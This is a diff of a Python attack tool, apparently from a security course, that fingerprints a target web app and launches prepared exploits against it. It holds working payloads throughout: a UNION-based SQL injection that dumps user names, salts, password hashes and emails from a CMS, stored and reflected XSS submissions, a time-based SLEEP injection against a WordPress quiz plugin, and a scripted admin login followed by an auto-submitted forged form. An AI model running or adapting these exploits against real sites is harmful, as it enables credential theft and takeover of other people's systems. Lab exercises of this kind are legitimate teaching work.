@@ -3,165 +3,212 @@ import requests
 from bs4 import BeautifulSoup
 from bs4 import Comment
 import sys
+import re
 
 browser = mechanize.Browser()
 browser.set_handle_robots(False)
 
-#ask the user the url to exploit
-#url = "http://localhost/InformationSecurity/CMSsite-master/"
-url = input("Enter the url of the website you want to exploit: ")
+exit = "n"
+while exit != "y":
+    #ask the user the url to exploit
+    #url = "http://localhost/InformationSecurity/CMSsite-master/"
+    url = input("Enter the url of the website you want to exploit: ")
 
-try:
     browser.open(url)
+
+    #make sure there is a slash at the end of the url
+    if url[-1] != '/':
+        url = url + '/'
 
     print("\n" + "Title: " + browser.title() + "\n")
 
     page = browser.response().read()
     soupParser = BeautifulSoup(page, "html.parser")
 
-    #define the target
+    #IDENTIFICATION OF THE TARGET
     target=0
-
-
-
-    #Is it Victor Alagwu's Simple CMS?
-    comments = soupParser.findAll(string=lambda text: isinstance(text, Comment))
-    #printing the message with the id I chose
-    for comment in comments:
-        if "Victor Alagwu" in comment and "Simple Content Management System" in comment:
-            print("This is Simple Content Management System by Victor Alagwu")
-            target = 1
-            break
 
     #Is it codeIgniter?
     if "codeigniter" in url:
         target = 2
 
     #Is it wordpress chained quiz?
-    if 'quizexploit' in browser.title() :
+    elif 'quizexploit' in browser.title() :
         target = 3
-
-
-    #show possible hacks for the target
-    if target==1:
-        print('Possible exploit for this target:')
-        print('1. SQL injection (retrieve MySQL version and DB name)')
-        print('2. Persistent XSS')
-        attack = input("Attack: ")
-        
-        #make sure there is a slash at the end of the url
-        if url[-1] != '/':
-            url = url + '/'
-       
-        if attack == '1':
-            #get MySQL version and database name of the website
-            browser.open(url + "category.php?cat_id=-1+UNION+SELECT+1,2,VERSION(),DATABASE(),5,6,7,8,9,10;+--")
-            page = browser.response().read()
-            soupParser = BeautifulSoup(page, "html.parser")
-
-            titles = soupParser.findAll("a", {"href": "post.php?post=1"})
-            print("MySQL version: " + titles[0].text)
-
-            authors = soupParser.findAll("h3")
-            print("Database name: " + authors[0].a.text)
-        elif attack == '2':
-            browser.open(url + "post.php?post=1")
-            browser.select_form(nr=0)
-
-            browser.form['comment_author'] = '<script>alert(1)</script>'
-            browser.form['comment_email'] = 'hacker@gmail.com'
-            browser.form['comment_content'] = '<p>Hacker</p>'
-
-            req = browser.submit()
+    else:
+        title = ""
+        try:
+            #if it hasn't this plugin, the mechanize throws an exception for 404
+            browser.open(url + "membership-login/")
+            title = browser.title()
+        except:
+            title = None
+            
+        #Is it Simple WordPress Membership?
+        if title and "Member Login" in  title:
+            print("This has the Simple Membership plugin")
+            target = 4 
         else:
-            print("Insert a valid attack number")
-
-    if target==2:
-        r = requests.get(url) #"http://localhost/codeigniter/index.php/xssdemo"
-        soup = BeautifulSoup(r.content, "html.parser")
-
-        print('Form where the malicious code has to be injected:')
-        print()
-
-        form = soup.find('form')
-        print (form)
-        print()
-
-        payload =  '<img/src=">" onerror=alert(1)>'
-
-        print("Payload:")
-        print()
-        print(payload)
-        print()
-
-        postdata = {
-                "xss" : payload
-               }
-
-        r = requests.post(url, data=postdata)
-
-        soup = BeautifulSoup(r.content, "html.parser")
-
-        print('Injected code:')
-        print()
-        print (soup.find('img'))
+            #Is it Victor Alagwu's Simple CMS?
+            comments = soupParser.findAll(string=lambda text: isinstance(text, Comment))
+            #printing the message with the id I chose
+            for comment in comments:
+                if "Victor Alagwu" in comment and "Simple Content Management System" in comment:
+                    print("This is Simple Content Management System by Victor Alagwu")
+                    target = 1
+                    break
 
 
-    if target == 3 :
-        print ('I am going to exploit the wordpress website with the chained quiz plugin.')
-        print ('The variable answer in the post request can be subject of time-based sql injection. \n')
-        print ('I am going to inject the function SLEEP(15), that is a mySQL function.')
-        print ('This means that if I get the answer after 5 seconds the underlying database is a mySQL database.')
-
-        postdata = {
-                "answer" : '1) AND (SELECT 8561 FROM (SELECT(SLEEP(15)))UzqU) AND (1071=1071',
-                "question_id" : 1,
-                "quiz_id" : 1,
-                "question_type" : "radio",
-                "points" : 0,
-                "action" : "chainedquiz_ajax",
-                "chainedquiz_action" : "answer",
-                "total_questions" : 1
-               }
-
-        print ('Payload:')
-        print (postdata)
-
-        if url[-1] != '/':
-            url = url + '/'
-
-        url = url + 'wp-admin/admin-ajax.php'
-
-        print("requesting")
-
-        r = requests.post(url, data=postdata)
-
-        print ("done")
-
-
-    elif target==0:
+    #EXPLOITS
+    if target == 0:
         print("I cannot define the target")
+    else:
+        print("Identified Target! Type: " + str(target))
+        print()
 
-except:
-    e = sys.exc_info()[0]
-    print( "Error: %s" % e )
+        #show possible hacks for the target
+        if target==1:
+            print('Possible exploit for this target:')
+            print('1. SQL injection (retrieve MySQL version and DB name)')
+            print('2. Persistent XSS')
+            print()
+            attack = input("Attack: ")
+            
+            if attack == '1':
+                #get users, MySQL version and database name of the website
+                #some of this parameters are not shown in the page, but can are retrieved from the database anyway
+                browser.open(url + "category.php?cat_id=-1+UNION+SELECT+user_id,user_firstname,user_name,randsalt,user_password,user_email,user_role,user_lastname,VERSION(),DATABASE()+FROM+users;+--")
+                page = browser.response().read()
+                soupParser = BeautifulSoup(page, "html.parser")
 
-#text = div.text
-#text = "".join([s for s in text.splitlines(True) if s.strip("\r\n")])
-#almost_clean_text = text.replace('&lt','')
-#clean_text = almost_clean_text.replace('&gt','')
-#print(clean_text.lstrip() + '\n')
+                users = []
+
+                #parsing the user data
+                i = 0
+                userIdNames = soupParser.findAll("h2")
+                mail = soupParser.findAll("img")
+                passwords = re.findall("<\/span>Posted on (.*?)<\/p>", str(page))
+                randsalts = soupParser.findAll("h3")
+                roles = re.findall("<p>([a-zA-Z]*?)\.\.\.\.\.\.\.\.\.<\/p>", str(page))
+
+                for user in userIdNames:
+                    x = re.search("<h2><a href=\"post\.php\?post=([0-9]+)\">(.+)<\/a><\/h2>", str(user))
+                    users.append({'user_id': x.group(1), 'user_name': x.group(2), 'password': passwords[i], 'mail': mail[i]['src'][4:], 'role':roles[i], 'randsalt': re.search("<a href=\"#\">(.+)<\/a>", str(randsalts[i])).group(1)})
+                    i = i + 1
+                    
+                    
+                print()
+                print("Users:")
+                print()
+                print()
+                for user in users:
+                    print(user)
+                    print()
+                    
+                print()
+                print()
+                #authors = soupParser.findAll("h3")
+                #print("Database name: " + authors[0].a.text)
 
 
-#opening a page injecting the malicious sql code with a specific ID to see a specific messagge
-#response = browser.open("http://localhost:8888/wordpress/wp-admin/admin.php?page=simple-personal-message-outbox&action=view&message=5%20UNION%20SELECT%20*%20FROM%20wp_spm_message")
+            elif attack == '2':
+                browser.open(url + "post.php?post=1")
+                browser.select_form(nr=0)
+
+                browser.form['comment_author'] = '<script>alert(1)</script>'
+                browser.form['comment_email'] = 'hacker@gmail.com'
+                browser.form['comment_content'] = '<p>Hacker</p>'
+
+                req = browser.submit()
+            else:
+                print("Insert a valid attack number")
+
+        elif target==2:
+            r = requests.get(url) #"http://localhost/codeigniter/index.php/xssdemo"
+            soup = BeautifulSoup(r.content, "html.parser")
+
+            print('Form where the malicious code has to be injected:')
+            print()
+
+            form = soup.find('form')
+            print (form)
+            print()
+
+            payload =  '<img/src=">" onerror=alert(1)>'
+
+            print("Payload:")
+            print()
+            print(payload)
+            print()
+
+            postdata = {
+                    "xss" : payload
+                    }
+
+            r = requests.post(url, data=postdata)
+
+            soup = BeautifulSoup(r.content, "html.parser")
+
+            print('Injected code:')
+            print()
+            print (soup.find('img'))
 
 
-#browser.select_form("loginform")
+        elif target == 3 :
+            print ('I am going to exploit the wordpress website with the chained quiz plugin.')
+            print ('The variable answer in the post request can be subject of time-based sql injection. \n')
+            print ('I am going to inject the function SLEEP(15), that is a mySQL function.')
+            print ('This means that if I get the answer after 5 seconds the underlying database is a mySQL database.')
 
-#browser.form['log'] = 'test'
-#browser.form['pwd'] = 'test'
-#browser.submit()
+            postdata = {
+                    "answer" : '1) AND (SELECT 8561 FROM (SELECT(SLEEP(15)))UzqU) AND (1071=1071',
+                    "question_id" : 1,
+                    "quiz_id" : 1,
+                    "question_type" : "radio",
+                    "points" : 0,
+                    "action" : "chainedquiz_ajax",
+                    "chainedquiz_action" : "answer",
+                    "total_questions" : 1
+                    }
 
-#printing the title of the page to show my steps
-#print ("\n" + "# " + browser.title() + "\n")
+            print ('Payload:')
+            print (postdata)
+
+            url = url + 'wp-admin/admin-ajax.php'
+
+            print("requesting")
+
+            r = requests.post(url, data=postdata)
+
+            print ("done")
+
+        elif target == 4:
+            #simulate login of the admin
+            print()
+            print("Wordpress admin login")
+            print()
+            sign_in = browser.open(url + "wp-login.php")
+
+            browser.select_form(nr = 0)
+            browser["log"] = "admin"
+            browser["pwd"] = "password"
+
+            logged_in = browser.submit() 
+            logincheck = logged_in.read()
+
+            print(logged_in.code)
+            print(logged_in.info())
+            print()
+            
+            #open malicious html page
+            browser.open("file:///" + os.getcwd() + "/index.html")
+            
+            browser.select_form(nr = 0)
+            browser.submit() 
+            #form is automatically submitted
+
+            print("visit " + url + "wp-admin/admin.php?page=simple_wp_membership to see the modifications")
+    print()
+    print()
+    exit = input("Do you want to exit (y/n)?")
+    print()
